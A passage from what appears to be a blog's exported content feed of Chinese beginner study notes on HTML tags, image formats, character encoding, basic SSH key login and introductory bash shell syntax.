title="&amp;开头，；结尾"></a>&amp;开头，；结尾</h3></li></ol><h1 id="图片标签"><a href="#图片标签" class="headerlink" title="图片标签"></a>图片标签</h1><h2 id="使用img-image-标签来向网页中引入一个外部图片"><a href="#使用img-image-标签来向网页中引入一个外部图片" class="headerlink" title="使用img(image)标签来向网页中引入一个外部图片"></a>使用img(image)标签来向网页中引入一个外部图片</h2><ol><li>img标签也是一个自结束标签<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2></li><li>img标签属于一种替换元素，介于行内元素和块元素之间，具备行内元素和块元素的特点<h3 id="src：设置一个外部图片的路径"><a href="#src：设置一个外部图片的路径" class="headerlink" title="src：设置一个外部图片的路径"></a>src：设置一个外部图片的路径</h3></li><li>路径规则和超链接是一样的，src指定的是外部图片的路径<h3 id="alt：可以用来设置图片的描述"><a href="#alt：可以用来设置图片的描述" class="headerlink" title="alt：可以用来设置图片的描述"></a>alt：可以用来设置图片的描述</h3></li><li>（当图片不能显示时，直接显示alt中的内容），搜索引擎可以通过alt属性来识别不同的图片（百度专门搜索图片的时候就是用alt）</li><li>如果不写alt，搜索引擎将不会对img中的图片进行收录<h3 id="width：可以用来修改图片的宽度，一般使用px为单位（像素）"><a href="#width：可以用来修改图片的宽度，一般使用px为单位（像素）" class="headerlink" title="width：可以用来修改图片的宽度，一般使用px为单位（像素）"></a>width：可以用来修改图片的宽度，一般使用px为单位（像素）</h3><h3 id="height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小"><a href="#height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小" class="headerlink" title="height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小"></a>height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小</h3><h2 id="如果两个值同时指定，则按照你指定的值来设置"><a href="#如果两个值同时指定，则按照你指定的值来设置" class="headerlink" title="如果两个值同时指定，则按照你指定的值来设置"></a>如果两个值同时指定，则按照你指定的值来设置</h2></li><li>如果两个值同时指定，则按照你指定的值来设置<h2 id="一般开发中除了自适应页面，不建议设置width和height"><a href="#一般开发中除了自适应页面，不建议设置width和height" class="headerlink" title="一般开发中除了自适应页面，不建议设置width和height"></a>一般开发中除了自适应页面，不建议设置width和height</h2></li><li>让美工话自己想要的大小<h2 id="lt-img-src-”路径”-alt-”图片描述”-gt"><a href="#lt-img-src-”路径”-alt-”图片描述”-gt" class="headerlink" title="&lt; img src=”路径” alt=”图片描述” /&gt;"></a>&lt; img src=”路径” alt=”图片描述” /&gt;</h2><h1 id="图片格式"><a href="#图片格式" class="headerlink" title="图片格式"></a>图片格式</h1></li><li>JPEG(JPG):支持的颜色比较多，图片可以压缩，但是不支持透明(指的是背景透明)，一般用来保存照片等颜色丰富的图片</li><li>GIF：支持的颜色少，只支持简单的透明（背景透明）（但是边界会有白边），支持动态图，图片颜色单一或者是动态图时可以使用gif</li><li>PNG：支持的颜色多，并且支持复杂的透明（背景透明），可以用来显示颜色复杂的透明的图片<h2 id="图片的使用原则："><a href="#图片的使用原则：" class="headerlink" title="图片的使用原则："></a>图片的使用原则：</h2></li><li>效果不一致用好的</li><li>效果一致用小的（jpg一般小于png）</li></ol><h1 id="列表-list"><a href="#列表-list" class="headerlink" title="列表(list)"></a>列表(list)</h1><h2 id="成组出现"><a href="#成组出现" class="headerlink" title="成组出现"></a>成组出现</h2><ol><li><img src="https://s2.loli.net/2022/05/13/UJNDSeWis49Hnzk.png"></li></ol><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><ol><li>使用ul标签来创建无序标签</li><li>使用li表示列表项</li><li><img src="https://s2.loli.net/2022/05/13/1LZPmuA2fd7RUn3.png"></li><li><img src="https://s2.loli.net/2022/05/13/vVdlJ4HmbXiaYPZ.png"></li></ol><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><ol><li>使用ol标签来创建有序标签</li><li><img src="https://s2.loli.net/2022/05/13/wCnWDPHkm3GV7yR.png"></li></ol><h2 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h2><ol><li>为一些东西下定义</li><li>使用&lt; dl&gt;标签来创建定义列表</li><li>使用&lt; dd&gt;标签来对内容进行解释说明</li><li>使用下拉菜单时可以使用</li></ol><h2 id="列表之间可以互相嵌套"><a href="#列表之间可以互相嵌套" class="headerlink" title="列表之间可以互相嵌套"></a>列表之间可以互相嵌套</h2><p><img src="https://s2.loli.net/2022/05/13/ezo4qlruRNcmdZ1.png"></p><h1 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h1><h2 id="超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置"><a href="#超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置" class="headerlink" title="超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置"></a>超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置</h2><h2 id="lt-a-gt"><a href="#lt-a-gt" class="headerlink" title="&lt; a&gt;"></a>&lt; a&gt;</h2><ol><li>使用a标签来创建超链接</li><li>是一个行内元素</li><li>&lt; a&gt;标签中可以放任何元素</li></ol><h3 id="属性href"><a href="#属性href" class="headerlink" title="属性href"></a>属性href</h3><ol><li>href指定跳转的目标路径<br><img src="https://s2.loli.net/2022/05/13/LnEjVowTU79uS8r.png"></li><li>值可以是一个外部页面的地址</li><li>也可以写一个内部页面的地址</li><li>当在同一个目录下，可以写相对于当前目录的地址</li></ol><h3 id="可以写绝对路径"><a href="#可以写绝对路径" class="headerlink" title="可以写绝对路径"></a>可以写绝对路径</h3><h3 id="也可以写相对路径"><a href="#也可以写相对路径" class="headerlink" title="也可以写相对路径"></a>也可以写相对路径</h3><ol><li>当我们需要跳转到服务器内部的页面时，一般用相对路径</li><li>./可以省略不写，如果不写./，也不写../，则相当于写了./</li><li>./07.html和07.html相同<br><img src="https://s2.loli.net/2022/05/13/YwThiqOKbHr5eQA.png"></li></ol><h3 id="通过颜色的区别来区分"><a href="#通过颜色的区别来区分" class="headerlink" title="通过颜色的区别来区分"></a>通过颜色的区别来区分</h3><ol><li>紫色的是点过的</li><li>蓝色的是没有点过的</li></ol><h2 id="超链接的其它用法"><a href="#超链接的其它用法" class="headerlink" title="超链接的其它用法"></a>超链接的其它用法</h2><h3 id="跳转出一个新的页面，而不是覆盖掉当前页面"><a href="#跳转出一个新的页面，而不是覆盖掉当前页面" class="headerlink" title="跳转出一个新的页面，而不是覆盖掉当前页面"></a>跳转出一个新的页面，而不是覆盖掉当前页面</h3><h4 id="target属性"><a href="#target属性" class="headerlink" title="target属性"></a>target属性</h4><ol><li>_self默认值，在当前页面中打开超链接</li><li>_blank,在一个新的页面中打开超链接</li><li>国内用_blank很多，但是会在不经意间打开很多窗口，所以国外使用_self较多</li></ol><h3 id="回到顶部"><a href="#回到顶部" class="headerlink" title="回到顶部"></a>回到顶部</h3><ol><li>可以将超链接的href属性设置为#,这样点击超链接之后，页面不会发生跳转，而是转到当前页面的顶部位置<pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;#&quot;,target&#x3D;&quot;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="回到底部"><a href="#回到底部" class="headerlink" title="回到底部"></a>回到底部</h3><ol><li>没有特殊的回到底部的href属性</li><li>可以通过设置id属性，使其跳转到”回到顶部”标签所在的位置</li><li>当id重复时，前面的id具有优先性，起那面的会生效</li></ol><h3 id="id属性"><a href="#id属性" class="headerlink" title="id属性"></a>id属性</h3><ol><li>唯一不重复的</li><li>每一个标签都可以添加一个id属性</li><li>id属性就是元素的唯一标识，同一个页面中不能出现重复的id属性</li><li>一般id的格式都是先一个小写英文字母，后数字<pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;#p3&quot;&gt;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="跳转到指定位置"><a href="#跳转到指定位置" class="headerlink" title="跳转到指定位置"></a>跳转到指定位置</h3><ol><li>只需要将href属性设置为：#目标元素的id属性值</li></ol><h3 id="作为占位符"><a href="#作为占位符" class="headerlink" title="#作为占位符"></a>#作为占位符</h3><ol><li>在开发中可以将#作为超链接的占位符使用</li></ol><h1 id="生成随机文本"><a href="#生成随机文本" class="headerlink" title="生成随机文本"></a>生成随机文本</h1><h2 id="lorem"><a href="#lorem" class="headerlink" title="lorem"></a>lorem</h2><ol><li>格式：lorem + 单词数量</li><li><img src="https://img-blog.csdn.net/20170802213142346?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxNDI5MTQ5Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"></li><li>乱数假文，用于排版领域来测试不同文本下的显示状态</li></ol><h1 id="内联框架"><a href="#内联框架" class="headerlink" title="内联框架"></a>内联框架</h1><ol><li>用于向当前页面中引入一个其它页面<h2 id="lt-iframe-gt-，参数"><a href="#lt-iframe-gt-，参数" class="headerlink" title="&lt; iframe&gt;，参数"></a>&lt; iframe&gt;，参数</h2></li><li>src=””,被引入的页面</li><li>width=””</li><li>height=””</li><li>frameborder:””内联框架的边框，0表示没有，1表示有</li></ol><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><ol><li>内联框架中的东西不会被搜索引擎所检索，即内联框架是一个标签而已</li></ol><h1 id="音频播放"><a href="#音频播放" class="headerlink" title="音频播放"></a>音频播放</h1><h2 id="lt-audio-gt"><a href="#lt-audio-gt" class="headerlink" title="&lt; audio&gt;"></a>&lt; audio&gt;</h2><ol><li>向一个页面中引入一个外部的音频文件</li><li>音视频文件引入时，默认情况下不允许自己控制播放停止<pre class="line-numbers language-none"><code class="language-none">&lt;audio src&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>添加属性controls是否允许用户控制播放，想则写，不想则不写（通过是否来判断）<pre class="line-numbers language-none"><code class="language-none">&lt;audio src&#x3D;&quot;&quot; controls&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>autoplay 音频文件是否自动播放,但是大部分浏览器都不会自动对音乐进行播放（但是为了防止轰一下吓人一跳，提升用户体验，则不会自动播放）<pre class="line-numbers language-none"><code class="language-none">&lt;audio src&#x3D;&quot;&quot; controls autoplay&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>loop 循环播放</li></ol><h3 id="更标准的格式"><a href="#更标准的格式" class="headerlink" title="更标准的格式"></a>更标准的格式</h3><ol><li>除了可以通过src来指定外部文件的路径以外，还可以通过source来指定文件路径</li><li>支持&lt; audio&gt;标签的可以，不支持的忽略标签，但是中间的文字就可以暴露出来了<pre class="line-numbers language-none"><code class="language-none">&lt;audio controls&gt;    对不起，您的浏览器不支持播放音频，请升级浏览器    &lt;source src&#x3D;&quot;路径.mp3&quot;&gt;    &lt;source src&#x3D;&quot;路径.ogg&quot;&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>mp3和ogg都要写，因为有的浏览器不支持mp3，如果不支持第一个，可以播放第二个，有效地解决浏览器兼容性问题<h1 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h1><h2 id="video标签来引入视频文件"><a href="#video标签来引入视频文件" class="headerlink" title="video标签来引入视频文件"></a>video标签来引入视频文件</h2><pre class="line-numbers language-none"><code class="language-none">&lt;video controls&gt;    &lt;source src&#x3D;&quot;&quot;&gt;    &lt;source src&#x3D;&quot;&quot;&gt;&lt;&#x2F;video&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="IE浏览器模拟IE11或更低等级的方法"><a href="#IE浏览器模拟IE11或更低等级的方法" class="headerlink" title="IE浏览器模拟IE11或更低等级的方法"></a>IE浏览器模拟IE11或更低等级的方法</h1><ol><li>f12打开开发者工具</li><li>选择文档模拟器<br><img src="https://s2.loli.net/2022/05/14/BptZMhvkOLVF73N.png"></li><li>即可模拟IE11及以下的内核<br><img src="https://s2.loli.net/2022/05/14/hSKZ8sCwyuTl7Rd.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>meta标签</title>
      <link href="/meta/"/>
      <url>/meta/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>乱码问题</title>
      <link href="/%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E5%92%8C%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F/"/>
      <url>/%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E5%92%8C%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="乱码问题"><a href="#乱码问题" class="headerlink" title="乱码问题"></a>乱码问题</h1><h3 id="乱码出现的原因：编码和解码所采用的字符集不同"><a href="#乱码出现的原因：编码和解码所采用的字符集不同" class="headerlink" title="乱码出现的原因：编码和解码所采用的字符集不同"></a>乱码出现的原因：编码和解码所采用的字符集不同</h3><ol><li>计算机只认识0和1</li><li>在计算机中保存的任何内容，最终都需要用二进制编码保存，包括网页中的内容</li><li>在读取内容时，需要将二进制编码再转换为正确的内容<h3 id="编码：依据一定的规则，将字符转换为二进制编码的过程"><a href="#编码：依据一定的规则，将字符转换为二进制编码的过程" class="headerlink" title="编码：依据一定的规则，将字符转换为二进制编码的过程"></a>编码：依据一定的规则，将字符转换为二进制编码的过程</h3><h3 id="解码：一句一定的规则，将二进制编码转换为字符的过程"><a href="#解码：一句一定的规则，将二进制编码转换为字符的过程" class="headerlink" title="解码：一句一定的规则，将二进制编码转换为字符的过程"></a>解码：一句一定的规则，将二进制编码转换为字符的过程</h3><h2 id="字符集：编码和解码所采用的规则"><a href="#字符集：编码和解码所采用的规则" class="headerlink" title="字符集：编码和解码所采用的规则"></a>字符集：编码和解码所采用的规则</h2></li><li>ASCII：７位０\１,128个</li><li>ISO－８８５９－１,8位0\1，256个</li><li>GBK：国标</li><li>GB２３１２：国标，中文系统的默认编码</li><li>UTF－８：万国码，支持地球上所有的文字(即unicode编码)</li><li>ANSI：自动以系统默认的编码来保存文件<h3 id="在中文系统浏览器中，默认都是使用GB２３１２进行解码"><a href="#在中文系统浏览器中，默认都是使用GB２３１２进行解码" class="headerlink" title="在中文系统浏览器中，默认都是使用GB２３１２进行解码"></a>在中文系统浏览器中，默认都是使用GB２３１２进行解码</h3><h2 id="使用notepad-可以直接将网页拖入，显示网页的源代码"><a href="#使用notepad-可以直接将网页拖入，显示网页的源代码" class="headerlink" title="使用notepad++可以直接将网页拖入，显示网页的源代码"></a>使用notepad++可以直接将网页拖入，显示网页的源代码</h2><h2 id="更改编码：在notepad-中，上方的菜单栏中选编码"><a href="#更改编码：在notepad-中，上方的菜单栏中选编码" class="headerlink" title="更改编码：在notepad++中，上方的菜单栏中选编码"></a>更改编码：在notepad++中，上方的菜单栏中选编码</h2><h2 id="更改浏览器解码方式"><a href="#更改浏览器解码方式" class="headerlink" title="更改浏览器解码方式"></a>更改浏览器解码方式</h2><h2 id="：meta是一个自结束标签，最后加上-表示结束"><a href="#：meta是一个自结束标签，最后加上-表示结束" class="headerlink" title="：meta是一个自结束标签，最后加上/表示结束"></a><meta charset="字符集" />：meta是一个自结束标签，最后加上/表示结束</h2><h2 id="txt中可以在保存的时候选择编码方式"><a href="#txt中可以在保存的时候选择编码方式" class="headerlink" title="txt中可以在保存的时候选择编码方式"></a>txt中可以在保存的时候选择编码方式</h2></li></ol>]]></content>
      
      
      <categories>
          
          <category> 编码 </category>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> 编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh</title>
      <link href="/ssh/"/>
      <url>/ssh/</url>
      
        <content type="html"><![CDATA[<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h2><h3 id="远程登录服务器"><a href="#远程登录服务器" class="headerlink" title="远程登录服务器"></a>远程登录服务器</h3><ol><li>ssh user@hostname(user为用户名，hostname为IP地址或域名)</li><li>默认登录端口为22号，如果想要登录某一特定端口：ssh user@hostname -p 22<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3></li><li>创建文件~/.ssh/config</li><li>输入Host myserver1</li><li>\t,HostName IP地址或域名</li><li>\t，User 用户名<h3 id="密钥登录"><a href="#密钥登录" class="headerlink" title="密钥登录"></a>密钥登录</h3></li><li>ssh-keygen(key generation),然后一直回车</li><li>执行结束后~/.ssh/目录下会多两个文件</li><li>id_rsa和(私钥)id_rsa.pub(公钥)</li><li>之后想要免密登录哪个服务器，即可将公钥传给哪个服务器即可</li><li>例如想要免密登录myserver。则将公钥中的内容复制到myserver中的~/.ssh/authorized_keys文件中即可</li><li>也可以使用命令一键添加公钥：ssh-copy-id myserver<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3></li><li>格式：ssh user@hostname command</li><li>ssh user@hostname ls -a</li><li>ssh myserver <code>for ((i = 0; i &lt; 10; i ++ )) do echo $i;done</code><h2 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h2></li></ol>]]></content>
      
      
      <categories>
          
          <category> ssh </category>
          
          <category> 远程登录服务器 </category>
          
          <category> 密钥 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> 远程登录服务器 </tag>
            
            <tag> 密钥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell语法</title>
      <link href="/shell%E8%AF%AD%E6%B3%95/"/>
      <url>/shell%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="shell语法"><a href="#shell语法" class="headerlink" title="shell语法"></a>shell语法</h1><h2 id="一门新的语言"><a href="#一门新的语言" class="headerlink" title="一门新的语言"></a>一门新的语言</h2><h2 id="Linux中常见的脚本"><a href="#Linux中常见的脚本" class="headerlink" title="Linux中常见的脚本"></a>Linux中常见的脚本</h2><ol><li>sh:/usr/bin/sh或/bin/sh</li><li>bash:/bin/bash</li><li>csh:/usr/bin/csh</li><li>ksh:/usr/bin/ksh</li><li>zsh<h2 id="开头必须使用-bin-bash指名bash为脚本解释器"><a href="#开头必须使用-bin-bash指名bash为脚本解释器" class="headerlink" title="开头必须使用 #! /bin/bash指名bash为脚本解释器"></a>开头必须使用 #! /bin/bash指名bash为脚本解释器</h2><h2 id="运行方式："><a href="#运行方式：" class="headerlink" title="运行方式："></a>运行方式：</h2><h3 id="作为可执行文件："><a href="#作为可执行文件：" class="headerlink" title="作为可执行文件："></a>作为可执行文件：</h3></li><li>chmod +x test.sh使脚本具有可执行权限</li><li>./test.sh当前路径下执行（相对路径）</li><li>/home/acs/test.sh绝对路径下执行</li><li>~/test.sh家目录下执行<h3 id="用解释器执行"><a href="#用解释器执行" class="headerlink" title="用解释器执行"></a>用解释器执行</h3></li><li>bash test.sh<h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2></li><li>意思和c++中cout 或 printf相同<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2></li><li>井号后面的都是注释，（与py相同）</li><li>其实脚本解释的时候#! /bin/bash解释的时候也是注释，只是系统识别为脚本解释器</li><li>多行注释：前 :&lt;&lt;EOF后：EOF;其中EOF也可以换成其他字符串，或者符号（必须首位相同）<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h3></li><li>定义变量不需要￥符号</li><li>name1=’yxc’ （单引号定于字符串）</li><li>name2=”yxc” (双引号定义字符串)</li><li>name3=yxc (可以不加引号，同样表示字符串)</li><li>注意等号两边不能有空格！！！否则会报错<h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3></li><li>使用变量需要加上￥（此符号在bash中意为取值），或者$（），花括号是可选的，主要是为了帮助解释器识别边界</li><li>echo $yxc</li><li>echo $(yxc)</li><li>echo会自动换行</li><li>错误：echo $namesacwing，因为没有括号，边界判断不对，不知道是namesacwing还是names<h3 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h3></li><li>readonly 变量(相当于c++中的const,声明了一个只读变量)        </li><li>declare -r 变量<h3 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h3></li><li>unset(类似于c++终端undef),如果一个变量被删除，后面调用的时候会替换为空（NULL）<h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3></li><li>自定义变量（局部变量）：子进程不能访问的变量</li><li>环境变量（全局变量）：子进程可以访问的变量<h3 id="自定义变量转环境变量"><a href="#自定义变量转环境变量" class="headerlink" title="自定义变量转环境变量"></a>自定义变量转环境变量</h3></li><li>export 变量名</li><li>declare -x 变量名</li><li>此时可以在子进程中使用变量              <h3 id="使用bash"><a href="#使用bash" class="headerlink" title="使用bash"></a>使用bash</h3></li><li>使用bash会将原进程bash睡眠掉，进入一个新的bash子进程</li><li>退出：exit或者ctrl+d          <h3 id="环境变量转自定义变量"><a href="#环境变量转自定义变量" class="headerlink" title="环境变量转自定义变量"></a>环境变量转自定义变量</h3></li><li>declare +x 变量名(可以理解为给变量赋予了自定义权限)<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2></li><li>字符串可以使用单引号，也可以使用双引号，也可以不使用引号<h3 id="单引号和双引号的区别（不加引号和双引号相同）"><a href="#单引号和双引号的区别（不加引号和双引号相同）" class="headerlink" title="单引号和双引号的区别（不加引号和双引号相同）"></a>单引号和双引号的区别（不加引号和双引号相同）</h3></li><li>单引号中的内容会原样输出，不会执行，不会取变量（即不会转义），即没有使用&amp;符号取值</li><li>双引号中的内容可以执行，可以取变量，即可以使用&amp;取值<h3 id="取出字符串的长度"><a href="#取出字符串的长度" class="headerlink" title="取出字符串的长度"></a>取出字符串的长度</h3></li><li>￥后面加井号</li><li>echo ${井号name},即可以取出name的长度（注意这个地方是花括号）<h3 id="提取子串"><a href="#提取子串" class="headerlink" title="提取子串"></a>提取子串</h3></li><li>根据下标取值</li><li>echo ${name:m:n}注意这个每一个下标前都有冒号<h2 id="查看自己开了多少进程"><a href="#查看自己开了多少进程" class="headerlink" title="查看自己开了多少进程"></a>查看自己开了多少进程</h2></li><li>top可以查看</li><li>按下<q>退出<h2 id="文件参数变量"><a href="#文件参数变量" class="headerlink" title="文件参数变量"></a>文件参数变量</h2></li><li>在执行shell脚本时可以想脚本传递参数，$1时第一个参数，$2是第二个参数…，特殊的是$0是文件名（包含路径）</li><li>$#:文件传入参数的个数（不包括文件名）</li><li>$*：由所有参数构成的用空格隔开的字符串，整体为字符串用双引号括起来</li><li>$@:每个参数分别用双引号括起来的字符串（@和*都是取所有的意思）</li><li>$$:脚本当前运行的进程ID</li><li>$?:上一条命令的退出状态（注意不是stdout,而是exit code）,0表示正常退出，其他值表示错误</li><li>$(command):返回command这条命令的stdout(注意区分stdout和exit code,输出的数是stdout,例如cout,而退出状态是exit code,例如c++中的return)</li><li><code>command</code> 返回command这条命令的stdout,（~上面的`）（7，8等价）<h3 id="小括号是获取stdout的值，-是取变量的值"><a href="#小括号是获取stdout的值，-是取变量的值" class="headerlink" title="$()小括号是获取stdout的值，${}是取变量的值"></a>$()小括号是获取stdout的值，${}是取变量的值</h3><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2></li><li>数组中可以存放多个不同的值，只支持一位数组，初始化时不需要指定数组大小（和py中的list一样不需要指定数组大小）<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3></li><li>数组用小括号表示，元素之间用空格隔开，如：array=(1 abc “def” yxc)</li><li>也可以直接定义数组中某个元素的值，如：array[0]=1,array[1]=abc,array[2]=”def”<h3 id="读取数组中某个元素的值"><a href="#读取数组中某个元素的值" class="headerlink" title="读取数组中某个元素的值"></a>读取数组中某个元素的值</h3></li><li>格式:${array[index]}</li><li>echo ${array[0]}<h3 id="读取整个数组"><a href="#读取整个数组" class="headerlink" title="读取整个数组"></a>读取整个数组</h3></li><li>格式：（@和*都是取所有的意思）</li><li>$(array[@])</li><li>$(array[*])<h2 id="expr命令"><a href="#expr命令" class="headerlink" title="expr命令"></a>expr命令</h2></li><li>格式：expr 表达式<br>####说明：</li><li>用空格隔开每一项</li><li>用反斜杠放在shell特定的字符前面，发现表达式运行错误时，可以试试转义</li><li>包含空格和其他特殊字符的字符串要用引号括起来  </li><li>expr会在stdout中输出结果，如果结果为真，stdout为1，否则为0</li><li>expr也有exit code返回值，如果为真，exit code为0，否则为1</li><li>stdout 和 exit code 返回值为互反（真时相反，假时也相反）<h3 id="字符串表达式（以下参数都是在expr后面的）"><a href="#字符串表达式（以下参数都是在expr后面的）" class="headerlink" title="字符串表达式（以下参数都是在expr后面的）"></a>字符串表达式（以下参数都是在expr后面的）</h3></li><li>输出长度：length STRING:返回STRING的长度</li><li>index STRING CHARSET:CHARSET中任意单个字符在STRING中最前面的字符位置，下标从１开始。如果子啊STRING中完全不存在CHARSET中的字符，则返回0</li><li>substr STRING POSITION LENGTH 返回STRING字符串中从POSITON开始，长度最大为LENGTH的子串。如果POSITION或LENGTH为负数，0或非数值，则返回空字符串（下标从1开始）          　        <h3 id="整数表达式"><a href="#整数表达式" class="headerlink" title="整数表达式"></a>整数表达式</h3></li><li>expr支持普通算数操作，算数表达式优先级低于字符串表达式，高于逻辑表达式</li><li><ul><li>— 加减运算，两端参数会转化为整数，如果转化失败则会报错</li></ul></li><li>*  / % 乘除取余运算，两端参数会转化为整数（*在shell中有特殊含义，所以需要转义）</li><li>（）可以表示优先级，但是需要用反斜杠转义<h3 id="逻辑表达式"><a href="#逻辑表达式" class="headerlink" title="逻辑表达式"></a>逻辑表达式</h3></li><li>| 或（c++中是||,少一半）：如果第一个值不是0，则会返回第一个值，第二个值不会计算，如果第一个参数非空并且非0，则会返回第一个参数的值</li><li>&amp; 与 (c++中是&amp;&amp;，少一半)：如果第一个值是0，则不会计算第二个值（短路特性），如果都非空并且非0，则会返回第一个值   </li><li>== 与 = 是同义词，但是还是要按照c++来写逻辑等号==，复制=</li><li>&lt; &lt;= &gt; &gt;= != == = 比较两端的参数，如果为true则返回1，否则返回0，expr首先尝试将两端的参数转换为整数，并做算数比较，如果转换失败，则按字符集排序规则做字符比较（strcmp）</li><li>需要转义的：*、（）、&gt;、&lt;=、|、&amp;</li><li>echo expr a + b加号和数字之间有空格<pre><code>                                                                                                                                                                                                                                                                                                                                                                                                                                                       ### read命令（cin或scanf）</code></pre></li><li>用于从标准输入中读入单行数据，当读到文件结束符时，exit code为1，否则为0</li><li>-p 添加提示信息(类似于input（提示信息）)</li><li>-t 后面跟秒数，定义输入字符的等待时间，超过等待时间后会自动忽略此命令<h3 id="echo命令（相当于cout或printf）"><a href="#echo命令（相当于cout或printf）" class="headerlink" title="echo命令（相当于cout或printf）"></a>echo命令（相当于cout或printf）</h3></li><li>输出格式：echo STRING</li><li>显示普通字符串：echo “Hello acterminal”,引号也可以省略</li><li>显示转义字符：echo “&quot;Hello acterminal&quot;“注意只能使用双引号，单引号不能够转义</li><li>也可以省略最外面表示字符串的双引号：echo &quot;Hello acterminal&quot;</li><li>显示变量：注意一定要用双引号，单引号不能够转义：name=yxc echo “My name is $name”</li><li>显示换行：直接\n无法显示换行转义，开启转义需要-e：例如:echo -e “Hi\n”,即可输出转义</li><li>强行不换行：-e后\c，\c可以取消最后的回车（和py中的end = “”相同），因为echo和py中的print相同，最后会自动换行。</li><li>显示结果到echo “Hello world” &gt; output.txt</li><li> 原样输出字符串，不进行转义或取变量：用单引号引起来</li><li> 显示命令的执行结果：用`引起来<h3 id="printf语句-c-中是以-隔开每一项，而shell中是以space隔开每一项"><a href="#printf语句-c-中是以-隔开每一项，而shell中是以space隔开每一项" class="headerlink" title="printf语句(c++中是以,隔开每一项，而shell中是以space隔开每一项)"></a>printf语句(c++中是以,隔开每一项，而shell中是以space隔开每一项)</h3></li><li>格式：printf format-string [arguments…]</li><li>printf “%d\n” yxc</li><li>shell中printf不自带换行,所以需要自己加上\n(此时无需-e进行转义)<h3 id="文件逻辑运算符"><a href="#文件逻辑运算符" class="headerlink" title="文件逻辑运算符"></a>文件逻辑运算符</h3></li><li>|与&amp;单与和单或是expr中的（必须在expr中使用）</li><li>而||与&amp;&amp;双与和双或是bash中自带的，可以直接在bash中使用</li><li>也带有短路特性</li><li>表达式中的exit code为0表示真，非0表示假</li><li>可以根据短路特性来做if表达式<h3 id="test命令"><a href="#test命令" class="headerlink" title="test命令"></a>test命令</h3></li><li>test命令用于判断文件类型，以及对变量做比较</li><li>test命令用exit code来返回结果，而不是使用stdout，0表示真，非0表示假</li><li>test -e test.sh &amp;&amp; echo “exist” || echo “Not exist”这种情况，如果前面test判断为0（真就会执行逻辑与（虽然是0，但是也是真，这种情况下可以不去看是0还是1，直接根据真假判断））<h4 id="文件类型判断"><a 